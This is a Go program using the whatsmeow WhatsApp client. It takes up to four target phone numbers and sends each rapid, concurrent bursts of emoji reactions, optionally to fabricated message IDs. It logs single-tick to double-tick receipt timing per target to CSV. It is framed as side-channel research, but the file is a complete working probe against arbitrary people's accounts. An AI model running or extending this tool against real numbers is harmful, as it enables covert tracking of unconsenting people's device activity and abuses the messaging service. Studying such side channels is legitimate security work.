/*
 * WhatsApp Reaction Timing Analyzer (Multi-Target)
 * 
 * This tool measures the delivery time delta between the server ACK (single tick)
 * and the delivery receipt (double tick) for message reactions.
 * 
 * Used for research into side-channel vulnerabilities in messaging protocols.
 */

package main

import (
	"bufio"
	"context"
	"encoding/csv"
	"fmt"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/mdp/qrterminal/v3"
	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waCommon"
	"go.mau.fi/whatsmeow/proto/waE2E"
	"go.mau.fi/whatsmeow/store/sqlstore"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	waLog "go.mau.fi/whatsmeow/util/log"
	"google.golang.org/protobuf/proto"
)

/*
 * WhatsApp Reaction Timing Analyzer (Multi-Target)
 *
 * Measures timing between:
 * - Server ACK (SendMessage return) = Single Tick
 * - Receipt "inactive"/"delivered" = Double Tick
 */

// CSVWriter handles concurrent writing of results to a CSV file
type CSVWriter struct {
	mu     sync.Mutex
	writer *csv.Writer
	file   *os.File
}

func NewCSVWriter(filename string) (*CSVWriter, error) {
	file, err := os.Create(filename)
	if err != nil {
		return nil, err
	}

	writer := csv.NewWriter(file)
	// Write CSV Header
	writer.Write([]string{"index", "message_id", "ack_timestamp", "delivery_timestamp", "delivery_time_ms"})
	writer.Flush()

	return &CSVWriter{
		writer: writer,
		file:   file,
	}, nil
}

func (w *CSVWriter) WriteReaction(r *Reaction) error {
	w.mu.Lock()
	defer w.mu.Unlock()

	err := w.writer.Write([]string{
		strconv.Itoa(r.Index),
		r.ID,
		r.AckTime.Format(time.RFC3339Nano),
		r.DeliveryTime.Format(time.RFC3339Nano),
		strconv.FormatInt(r.DeliveryDuration().Milliseconds(), 10),
	})
	if err != nil {
		return err
	}
	w.writer.Flush()
	return w.writer.Error()
}

func (w *CSVWriter) Close() error {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.writer.Flush()
	w.file.Close()
	return nil
}

type Reaction struct {
	ID           string
	Index        int
	AckTime      time.Time // Server ACK (Single tick)
	DeliveryTime time.Time // Delivery receipt (Double tick)
}

func (r *Reaction) DeliveryDuration() time.Duration {
	if r.DeliveryTime.IsZero() || r.AckTime.IsZero() {
		return 0
	}
	return r.DeliveryTime.Sub(r.AckTime)
}

type Tracker struct {
	mu        sync.RWMutex
	reactions map[string]*Reaction
	expected  int
	done      chan struct{}
	closed    bool
	csvWriter *CSVWriter
	name      string // Target identifier
}

func NewTracker(csvWriter *CSVWriter, name string) *Tracker {
	return &Tracker{
		reactions: make(map[string]*Reaction),
		done:      make(chan struct{}),
		csvWriter: csvWriter,
		name:      name,
	}
}

// RegisterAck marks when the server accepted the message
func (t *Tracker) RegisterAck(id string, index int, ackTime time.Time) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.reactions[id] = &Reaction{
		ID:      id,
		Index:   index,
		AckTime: ackTime,
	}
	fmt.Printf("[%s-%d] ✓ Single Tick (ID: %s)\n", t.name, index, id[:8])
}

// RegisterDelivery marks when the delivery receipt was received
func (t *Tracker) RegisterDelivery(id string, deliveryTime time.Time) {
	t.mu.Lock()
	defer t.mu.Unlock()
	if r, ok := t.reactions[id]; ok {
		if r.DeliveryTime.IsZero() {
			r.DeliveryTime = deliveryTime
			delivMs := r.DeliveryDuration().Milliseconds()
			fmt.Printf("[%s-%d] ✓✓ Double Tick: %dms\n", t.name, r.Index, delivMs)
			
			// Log to CSV immediately
			if t.csvWriter != nil {
				go t.csvWriter.WriteReaction(r)
			}
			
			t.checkDone()
		}
	}
}

func (t *Tracker) checkDone() {
	if t.closed {
		return
	}
	count := 0
	for _, r := range t.reactions {
		if !r.DeliveryTime.IsZero() {
			count++
		}
	}
	if count >= t.expected && t.expected > 0 {
		t.closed = true
		close(t.done)
	}
}

func (t *Tracker) Wait(timeout time.Duration) {
	select {
	case <-t.done:
	case <-time.After(timeout):
	}
}

func (t *Tracker) Stats() {
	t.mu.RLock()
	defer t.mu.RUnlock()

	var delivTimes []float64
	acked, delivered := 0, 0

	for _, r := range t.reactions {
		if !r.AckTime.IsZero() {
			acked++
		}
		if !r.DeliveryTime.IsZero() {
			delivered++
			delivTimes = append(delivTimes, float64(r.DeliveryDuration().Milliseconds()))
		}
	}

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("STATISTICS - %s\n", t.name)
	fmt.Printf("%s\n", strings.Repeat("=", 60))
	fmt.Printf("Reactions with ACK (single tick): %d\n", acked)
	fmt.Printf("Reactions delivered (double tick): %d\n", delivered)

	if len(delivTimes) > 0 {
		sort.Float64s(delivTimes)
		sum := 0.0
		for _, v := range delivTimes {
			sum += v
		}
		avg := sum / float64(len(delivTimes))
		
		fmt.Printf("\n📊 DELIVERY TIME (single tick → double tick):\n")
		fmt.Printf("   Average: %.0fms\n", avg)
		fmt.Printf("   Min:     %.0fms\n", delivTimes[0])
		fmt.Printf("   Max:     %.0fms\n", delivTimes[len(delivTimes)-1])
		
		// Median
		mid := len(delivTimes) / 2
		var median float64
		if len(delivTimes)%2 == 0 {
			median = (delivTimes[mid-1] + delivTimes[mid]) / 2
		} else {
			median = delivTimes[mid]
		}
		fmt.Printf("   Median:  %.0fms\n", median)
	}
}

// ============================================================================
// MULTI TRACKER
// ============================================================================

type MultiTracker struct {
	mu       sync.RWMutex
	trackers map[string]*Tracker // JID -> Tracker
}

func NewMultiTracker() *MultiTracker {
	return &MultiTracker{
		trackers: make(map[string]*Tracker),
	}
}

func (mt *MultiTracker) AddTracker(jid string, tracker *Tracker) {
	mt.mu.Lock()
	defer mt.mu.Unlock()
	mt.trackers[jid] = tracker
}

func (mt *MultiTracker) RegisterDelivery(jid string, msgID string, deliveryTime time.Time) {
	mt.mu.RLock()
	tracker, ok := mt.trackers[jid]
	mt.mu.RUnlock()
	
	if ok {
		tracker.RegisterDelivery(msgID, deliveryTime)
	}
}

func (mt *MultiTracker) WaitAll(timeout time.Duration) {
	mt.mu.RLock()
	var wg sync.WaitGroup
	for _, t := range mt.trackers {
		wg.Add(1)
		go func(tracker *Tracker) {
			defer wg.Done()
			tracker.Wait(timeout)
		}(t)
	}
	mt.mu.RUnlock()
	wg.Wait()
}

func (mt *MultiTracker) StatsAll() {
	mt.mu.RLock()
	defer mt.mu.RUnlock()
	for _, t := range mt.trackers {
		t.Stats()
	}
}

// ============================================================================
// GLOBALS
// ============================================================================

var (
	client       *whatsmeow.Client
	multiTracker *MultiTracker
	connected    = make(chan struct{})
)

// ============================================================================
// EVENT HANDLER
// ============================================================================

func eventHandler(evt interface{}) {
	switch v := evt.(type) {
	case *events.Connected:
		fmt.Println("\n✓ Connected to WhatsApp!")
		select {
		case <-connected:
		default:
			close(connected)
		}

	case *events.Receipt:
		now := time.Now()
		// "inactive" or "" = double tick (delivered)
		// "read" = blue ticks
		if v.Type == "inactive" || v.Type == types.ReceiptTypeDelivered || v.Type == types.ReceiptTypeRead {
			senderJID := v.Sender.String()
			for _, msgID := range v.MessageIDs {
				multiTracker.RegisterDelivery(senderJID, msgID, now)
			}
		}
	}
}

// ============================================================================
// UTILITY
// ============================================================================

func readLine(prompt string) string {
	fmt.Print(prompt)
	reader := bufio.NewReader(os.Stdin)
	line, _ := reader.ReadString('\n')
	return strings.TrimSpace(line)
}

func readInt(prompt string, def int) int {
	s := readLine(prompt)
	if s == "" {
		return def
	}
	v, err := strconv.Atoi(s)
	if err != nil {
		return def
	}
	return v
}

func parseJID(s string) types.JID {
	num := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' {
			return r
		}
		return -1
	}, s)
	return types.JID{User: num, Server: types.DefaultUserServer}
}

// ============================================================================
// MAIN
// ============================================================================

func main() {
	// Ctrl+C handler
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\n✗ Interrupted")
		if client != nil {
			client.Disconnect()
		}
		os.Exit(0)
	}()

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("   WhatsApp Reaction Timing Analyzer - Multi Target")
	fmt.Println("   Measurement: Single Tick → Double Tick")
	fmt.Println(strings.Repeat("=", 60))

	// Persistence Store
	container, err := sqlstore.New(context.Background(), "sqlite3",
		"file:whatsapp.db?_foreign_keys=on", waLog.Noop)
	if err != nil {
		fmt.Printf("DB Error: %v\n", err)
		return
	}

	deviceStore, err := container.GetFirstDevice(context.Background())
	if err != nil {
		fmt.Printf("Device Store Error: %v\n", err)
		return
	}

	// Client Setup
	client = whatsmeow.NewClient(deviceStore, waLog.Noop)
	client.AddEventHandler(eventHandler)

	fmt.Println("\n📱 Connecting...")

	if client.Store.ID == nil {
		qrChan, _ := client.GetQRChannel(context.Background())
		if err := client.Connect(); err != nil {
			fmt.Printf("Connection Error: %v\n", err)
			return
		}
		for evt := range qrChan {
			if evt.Event == "code" {
				qrterminal.GenerateHalfBlock(evt.Code, qrterminal.L, os.Stdout)
			}
		}
	} else {
		if err := client.Connect(); err != nil {
			fmt.Printf("Connection Error: %v\n", err)
			return
		}
	}

	select {
	case <-connected:
	case <-time.After(30 * time.Second):
		fmt.Println("✗ Connection Timeout")
		return
	}

	time.Sleep(500 * time.Millisecond)

	multiTracker = NewMultiTracker()

	// ========================================================================
	// CONFIGURATION
	// ========================================================================

	fmt.Printf("\n%s\n", strings.Repeat("=", 50))
	fmt.Println("CONFIGURATION")
	fmt.Printf("%s\n", strings.Repeat("=", 50))

	numTargets := readInt("Number of targets [1-4]: ", 1)
	if numTargets < 1 || numTargets > 4 {
		numTargets = 1
	}

	type TargetConfig struct {
		JID       types.JID
		MessageID string
		Name      string
		CSVFile   string
	}

	targets := make([]TargetConfig, numTargets)

	for i := 0; i < numTargets; i++ {
		fmt.Printf("\n--- TARGET %d ---\n", i+1)
		targetNum := readLine(fmt.Sprintf("Phone number %d (with country code): ", i+1))
		if targetNum == "" {
			fmt.Println("✗ Number required")
			return
		}
		targetJID := parseJID(targetNum)
		fmt.Printf("✓ Target %d: %s\n", i+1, targetJID.String())

		// Message ID
		fmt.Println("\nMode:")
		fmt.Println("  1. Send test message (recommended)")
		fmt.Println("  2. Use existing Message ID")
		fmt.Println("  3. Generate dummy Message ID")
		mode := readLine("Choice [1]: ")
		if mode == "" {
			mode = "1"
		}

		var targetMsgID string
		switch mode {
		case "1":
			fmt.Println("\n📤 Sending test message...")
			resp, err := client.SendMessage(context.Background(), targetJID, &waE2E.Message{
				Conversation: proto.String("Reaction timing test 🧪"),
			})
			if err != nil {
				fmt.Printf("✗ Error: %v\n", err)
				return
			}
			targetMsgID = resp.ID
			fmt.Printf("✓ Message ID: %s\n", targetMsgID)
			fmt.Println("⏳ Waiting 3 seconds...")
			time.Sleep(3 * time.Second)

		case "2":
			targetMsgID = readLine("Message ID: ")

		case "3":
			targetMsgID = fmt.Sprintf("3EB0%016X%08X", time.Now().UnixNano(), time.Now().Unix())
			fmt.Printf("✓ Dummy ID: %s\n", targetMsgID)
		}

		if targetMsgID == "" {
			fmt.Println("✗ Message ID required")
			return
		}

		csvFile := readLine(fmt.Sprintf("CSV Output file [results_%d.csv]: ", i+1))
		if csvFile == "" {
			csvFile = fmt.Sprintf("results_%d.csv", i+1)
		}

		targets[i] = TargetConfig{
			JID:       targetJID,
			MessageID: targetMsgID,
			Name:      fmt.Sprintf("T%d", i+1),
			CSVFile:   csvFile,
		}
	}

	// Parameters
	fmt.Printf("\n--- COMMON PARAMETERS ---\n")
	count := readInt("Number of reactions per target [10]: ", 10)
	delayBetweenInvioMs := readInt("Delay between sends ms [125]: ", 125)
	maxConcurrent := readInt("Max concurrent sends [40]: ", 40)
	timeoutSec := readInt("Response timeout sec [30]: ", 30)
	emoji := readLine("Emoji [👍]: ")
	if emoji == "" {
		emoji = "👍"
	}

	reactionsPerSec := 1000.0 / float64(delayBetweenInvioMs)
	
	fmt.Printf("\n✓ Config: %d targets, %d reactions each, round-robin every %dms (%.1f/sec total), %ds timeout\n", 
		numTargets, count, delayBetweenInvioMs, reactionsPerSec, timeoutSec)

	csvWriters := make([]*CSVWriter, numTargets)
	for i, target := range targets {
		csvWriter, err := NewCSVWriter(target.CSVFile)
		if err != nil {
			fmt.Printf("✗ Error creating CSV %s: %v\n", target.CSVFile, err)
			return
		}
		defer csvWriter.Close()
		csvWriters[i] = csvWriter

		tracker := NewTracker(csvWriter, target.Name)
		tracker.expected = count
		multiTracker.AddTracker(target.JID.String(), tracker)

		fmt.Printf("✓ Target %s: %s -> %s\n", target.Name, target.JID.String(), target.CSVFile)
	}

	readLine("\nPress ENTER to start...")

	// ========================================================================
	// ROUND-ROBIN SENDING
	// ========================================================================

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("ROUND-ROBIN REACTION SENDING (%d targets, every %dms)\n", numTargets, delayBetweenInvioMs)
	fmt.Printf("%s\n", strings.Repeat("=", 60))

	ctx := context.Background()
	sem := make(chan struct{}, maxConcurrent)

	counters := make([]int, numTargets)
	var counterMu sync.Mutex
	totalInvii := count * numTargets

	var wg sync.WaitGroup
	startTime := time.Now()

	for invioIdx := 0; invioIdx < totalInvii; invioIdx++ {
		targetIdx := invioIdx % numTargets
		target := targets[targetIdx]

		counterMu.Lock()
		counters[targetIdx]++
		reactionNum := counters[targetIdx]
		counterMu.Unlock()

		if reactionNum > count {
			continue
		}

		sem <- struct{}{}
		wg.Add(1)

		launchTime := time.Since(startTime).Milliseconds()

		go func(tConfig TargetConfig, tIdx int, rNum int, lTime int64) {
			defer wg.Done()
			defer func() { <-sem }()

			fmt.Printf("[%s-%d] 🚀 Launching at +%dms\n", tConfig.Name, rNum, lTime)

			msg := &waE2E.Message{
				ReactionMessage: &waE2E.ReactionMessage{
					Key: &waCommon.MessageKey{
						RemoteJID: proto.String(tConfig.JID.String()),
						FromMe:    proto.Bool(true),
						ID:        proto.String(tConfig.MessageID),
					},
					Text:              proto.String(emoji),
					SenderTimestampMS: proto.Int64(time.Now().UnixMilli()),
				},
			}

			resp, err := client.SendMessage(ctx, tConfig.JID, msg)
			ackTime := time.Now()

			if err != nil {
				fmt.Printf("[%s-%d] ✗ Error: %v\n", tConfig.Name, rNum, err)
				return
			}

			multiTracker.mu.RLock()
			tracker := multiTracker.trackers[tConfig.JID.String()]
			multiTracker.mu.RUnlock()
			if tracker != nil {
				tracker.RegisterAck(resp.ID, rNum, ackTime)
			}
		}(target, targetIdx, reactionNum, launchTime)

		if invioIdx < totalInvii-1 {
			time.Sleep(time.Duration(delayBetweenInvioMs) * time.Millisecond)
		}
	}

	wg.Wait()

	fmt.Printf("\n✓ All reactions sent!\n")

	// ========================================================================
	// WAIT FOR RECEIPTS
	// ========================================================================

	fmt.Printf("\n⏳ Waiting for double ticks (max %ds)...\n", timeoutSec)
	multiTracker.WaitAll(time.Duration(timeoutSec) * time.Second)

	// ========================================================================
	// SUMMARY
	// ========================================================================

	multiTracker.StatsAll()

	fmt.Printf("\n📁 Results saved to:\n")
	for _, target := range targets {
		fmt.Printf("   %s: %s\n", target.Name, target.CSVFile)
	}
	fmt.Println("\n✓ Analysis completed!")
	readLine("\nPress ENTER to exit...")

	client.Disconnect()
}
